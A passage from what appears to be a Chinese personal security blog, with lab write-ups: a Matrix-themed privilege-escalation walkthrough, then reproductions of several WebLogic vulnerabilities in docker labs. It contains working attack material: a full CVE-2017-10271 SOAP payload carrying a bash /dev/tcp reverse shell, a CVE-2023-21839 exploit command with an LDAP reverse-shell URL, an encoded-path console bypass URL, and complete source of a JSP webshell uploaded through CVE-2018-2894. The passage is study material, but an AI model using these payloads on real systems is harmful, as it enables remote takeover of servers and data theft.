alt="image-20240802185608055"></p><p>发现一串目录，在<code>Matrix/n/e/o/6/4/</code>目录下发现一个<code>secret.gz</code>文件，应该是一个提示，也可以发现是黑客帝国得尼奥得英文名</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802185905833.png" alt="image-20240802185905833"></p><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>下载下来试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.161/Matrix/n/e/o/6/4/secret.gz</span><br></pre></td></tr></table></figure><p>gunzip试了下，不是gzip文件</p><p>file查看一下，发现是ascii：text文件</p><p>直接cat查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:76a2173be6393254e72ffa4d6df1030a</span><br></pre></td></tr></table></figure><p>查下md5</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802191003458.png" alt="image-20240802191003458"></p><p>也可以不查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;xxx&quot; &gt; hash</span><br><span class="line">john --show --format=Raw-MD5 hash</span><br></pre></td></tr></table></figure><p>可以得到admin:passwd</p><h2 id="登陆页面目录扫描"><a href="#登陆页面目录扫描" class="headerlink" title="登陆页面目录扫描"></a>登陆页面目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.174.161:7331 -u admin:passwd</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802191437778.png" alt="image-20240802191437778"></p><p>发现data目录和robots.txt文件，分别访问</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802191515914.png" alt="image-20240802191515914"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802191526369.png" alt="image-20240802191526369"></p><p>可以发现一个data文件，下载尝试分析文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ip:7331/data/data --user admin --password passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file data</span><br><span class="line">PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure><p>是一个PE文件，放到ida里反编译一下</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802195504521.png" alt="image-20240802195504521"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guest:7R1n17yN30</span><br></pre></td></tr></table></figure><p>可以在dispose中找到一个账号密码对，结合剩下一个的ssh端口，推测是用该账号密码连接</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.174.161 -p6464</span><br></pre></td></tr></table></figure><p>连上后，发现很多指令都用不了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p>发现是rbash，尝试连接默认shell</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802200900060.png" alt="image-20240802200900060"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh guest@192.168.174.161 -p6464 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure><ul><li><code>&quot;bash --noprofile&quot;</code> 是在远程计算机上执行的命令。<code>bash</code> 是Bourne Again Shell的简称，是一种常用的Unix shell。<code>--noprofile</code> 选项告诉bash不要读取用户的profile文件，这在某些情况下可以防止执行一些可能不安全的脚本。</li></ul><p>再次echo shell,虽然说还是rbash但还是可以执行其它命令的，我们可以创建一个空的ssh的rsa密钥</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802200926473.png" alt="image-20240802200926473"></p><p>这个用户可以不用密码利用root身份去运行一个特定的文件。利用trinity这个用户身份还可以执行cp命令，看来这是突破口了。</p><p>利用cp将bash复制到root可以执行的文件位置，失败</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802201338624.png" alt="image-20240802201338624"></p><p>vi提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:!/bin/sh</span><br><span class="line">export PATH=&quot;/usr/bin&quot;</span><br><span class="line">/usr.bin/bash</span><br></pre></td></tr></table></figure><p>find一下有没有提权的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802202925298.png" alt="image-20240802202925298"></p><p>利用ssh-keygen生成一个密钥，准备给trinity用。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802201425373.png" alt="image-20240802201425373"></p><p>查看一下sshd的配置文件，可以看到开着pubkey认证，并且密钥保存在.ssh&#x2F;authorized_keys，下一步就把我们生成的密钥放到trinity用户目录下就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802201638580.png" alt="image-20240802201638580"></p><p>把刚生成的id_rsa.pub权限修改为777，让非guest的用户也有执行权限，然后利用trinity身份的cp命令将这个文件复制到trinity&#x2F;.ssh&#x2F;authorized_keys</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 id_rsa.pub</span><br><span class="line">chmod 777 .ssh</span><br><span class="line">sudo -u trinity /bin/cp .ssh/id_rsa.pub  /home/trinity/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>再ssh登陆trinity</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh trinity@127.0.0.1 -i .ssh/id_rsa.pub -p 6464</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802204428518.png" alt="image-20240802204428518"></p><p>登录trinity用户发现可以以root用户权限无密码使用<code>oracle</code>命令，直接将<code>/usr/bin/bash</code>复制到<code>trinity家目录</code>下并改名为<code>oracle</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/bin/bash oracle</span><br><span class="line">chmod +x oracle</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802204506245.png" alt="image-20240802204506245"></p><p>调用oracle，成功拥有root权限，在root目录下找到flag.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./oracle </span><br><span class="line">cd /root/</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240802204640441.png" alt="image-20240802204640441"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic</title>
      <link href="/2024/07/23/weblogic/"/>
      <url>/2024/07/23/weblogic/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p><a href="https://blog.csdn.net/rumil/article/details/133036788">https://blog.csdn.net/rumil/article/details/133036788</a></p><p><a href="https://www.freebuf.com/articles/web/372568.html">https://www.freebuf.com/articles/web/372568.html</a></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）</p><p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p><p><strong>T3协议：</strong></p><p>用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。</p><p><strong>RMI方法：</strong></p><p>远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）</p><p><strong>JRMP：</strong></p><p>Java远程消息交换协议JRMP。</p><p>JRMP是一个Java远程方法协议，该协议基于TCP&#x2F;IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议，而JRMP底层则是基于TCP传递。</p><p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI去进行实现的。</p><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>简要介绍：<a href="https://www.cnblogs.com/chen-w/p/14652153.html">https://www.cnblogs.com/chen-w/p/14652153.html</a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先使用docker起一个weblogic CVE-2017-1027的环境，进入到vulhub&#x2F;weblogic&#x2F;CVE-2017-1027</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>启动成功后</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716213102663.png" alt="image-20240716213102663"></p><figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>查看运行状态</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716213125924.png" alt="image-20240716213125924"></p><p>接着去访问本机的7001端口，出现如下页面，说明服务成功开启：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716214217994.png" alt="image-20240716214217994"></p><p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716214533663.png" alt="image-20240716214533663"></p><p>可以先扫一下服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716222238125.png" alt="image-20240716222238125"></p><p>用相关漏洞的扫描工具也可以</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240716222344082.png" alt="image-20240716222344082"></p><h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718205520947.png" alt="image-20240718205520947"></p><p>能弹啊，docker为什么弹不了，还要配置网卡吗</p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 637</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">12345678910111213141516171819202122232425262728293031</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic 允许远程用户在未经授权的情况下通过IIOP&#x2F;T3进行JNDI lookup 操作，当JDK版本过低或本地存在javaSerializedData时，这可能会导致RCE漏洞。</p><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic_Server &#x3D; 12.2.1.3.0<br>WebLogic_Server &#x3D; 12.2.1.4.0<br>WebLogic_Server &#x3D; 14.1.1.0.0<br><strong>CVE-2023-21839是一个weblogic的JNDI注入漏洞。</strong></p><p>由于Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行。</p><h3 id="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"><a href="#环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）" class="headerlink" title="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"></a>环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095001438.png" alt="image-20240717095001438"></p><p>访问靶场地址：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095020526.png" alt="image-20240717095020526"></p><p>Nmap扫描：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095129769.png" alt="image-20240717095129769"></p><p>扫描验证T3是否开启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717095226815.png" alt="image-20240717095226815"></p><p>开启LDAP和HTTP服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137//攻击者ip</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717224640807.png" alt="image-20240717224640807"></p><p>监听端口（用于接收反弹的shell）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717224800690.png" alt="image-20240717224800690"></p><p>使用工具包</p><p>j教程使用的：<a href="https://github.com/ASkyeye/CVE-2023-21839">GitHub - ASkyeye&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE)</a></p><p>这个下载下来要在linux环境下编译，windows下编译了好像不行用，不懂是什么问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999</span><br></pre></td></tr></table></figure><p>因为担心docker在虚拟机nat不通就没在外面测试了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240717225351922.png" alt="image-20240717225351922"></p><p>最后也是成功反弹shell了，这个java的漏洞的环境太难搭了</p><p>成功复现，记得关闭docker启动的镜像</p><p>关闭镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure><p>因为docker-compose up -d也是拉镜像启动，所以本地会有镜像保留，有些还挺大的，不需要的话可以删了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker rmi -f 镜像id</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><p><a href="https://cloud.tencent.com/developer/article/2168616">https://cloud.tencent.com/developer/article/2168616</a></p><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p><strong>- WebLogic Console权限认证绕过漏洞（CVE-2020-14750） -</strong> </p><p>Weblogic Server是Oracle公司的一款适用于云环境和传统环境的应用<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。Oracle官方在2020年10月发布了关键补丁更新公告，其中包括一个CVE-2020-14750为 WebLogic Console权限认证绕过的漏洞CVE-2020-14882补丁的绕过漏洞，CVSS 评分 9.8 分。CVE-2020-14882 补丁被绕过后，攻击者就可以再度绕过Console控制台的权限校验，访问原本需要登录才可以访问的资源和接口功能。尽管 CVE-2020-14883 这个后台的任意代码执行漏洞已被修复，但攻击者依然可以通过寻找利用其他合适的后台接口漏洞，实现远程代码执行，从而获取服务器权限。</p><p>影响版本：</p><ul><li>Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li></ul><h4 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h4><p>使用<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/0xn0ne/WeblogicScanner&source=article&objectId=2168616">WeblogicScaner</a>工具检测目标网站存在CVE-2020-14750漏洞。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750</span><br></pre></td></tr></table></figure><p>构造特殊URL地址绕过WebLogic Console控制台权限进行访问：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114246101.png" alt="image-20240718114246101"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114220535.png" alt="image-20240718114220535"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718114153961.png" alt="image-20240718114153961"></p><h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do</p><p>这里进后台的部分借用前面的漏洞</p><p>访问漏洞页面（需要手动设置一下环境设置Work Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123446376.png" alt="image-20240718123446376"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fafa&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123559300.png" alt="image-20240718123559300"></p><p>文件上传的路径为<a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F%E6%9C%89%E4%B8%A4%E7%A7%8D%EF%BC%8C%E5%85%B6%E4%B8%80%E4%B8%BAbp%E6%8A%93%E5%8C%85%E6%9F%A5%E7%9C%8B%EF%BC%8C">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，这里的时间戳获取方式有两种，其一为bp抓包查看，</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718124112290.png" alt="image-20240718124112290"></p><p>其二利用浏览器自带的检查获取，如下所示：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240718123631916.png" alt="image-20240718123631916"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.149:7001/ws_utc/css/config/keystore/1721275902739_ma.jsp</span><br></pre></td></tr></table></figure><p>这里的环境有点问题，待测，重新用docker起了环境，重复上述步骤</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104623897.png" alt="image-20240719104623897"></p><p>这里先去靶场看看后台账户密码，默认管理员用户是weblogic，此处密码为h3L0YiTp</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104726677.png" alt="image-20240719104726677"></p><p>输入账户密码，登录后台</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719104859192.png" alt="image-20240719104859192"></p><p>成功登录进去，点击base_domain可看到设置页面，然后点击高级，勾选启用Web服务测试页；</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105013862.png" alt="image-20240719105013862"></p><p>点击保存</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105135228.png" alt="image-20240719105135228"></p><p>访问漏洞页面<a href="http://192.168.174.137:7001/ws_utc/config.do%EF%BC%88%E9%9C%80%E8%A6%81%E6%89%8B%E5%8A%A8%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E7%8E%AF%E5%A2%83%E8%AE%BE%E7%BD%AEWork">http://192.168.174.137:7001/ws_utc/config.do（需要手动设置一下环境设置Work</a> Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css）</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105223765.png" alt="image-20240719105223765"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为rebeyond）；</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105321462.png" alt="image-20240719105321462"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105401564.png" alt="image-20240719105401564"></p><p>文件上传的路径为<a href="http://192.168.174.137:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://192.168.174.137:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105432337.png" alt="image-20240719105432337"></p><p>尝试访问文件地址，发现文件存在且可以正常访问</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105519747.png" alt="image-20240719105519747"></p><p>冰蝎连接</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105611812.png" alt="image-20240719105611812"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240719105644878.png" alt="image-20240719105644878"></p><p>成功获得shell</p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)。Oracle WebLogic Server的T3通讯协议的实现中存在反序列化漏洞。远程攻击者通过T3协议在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 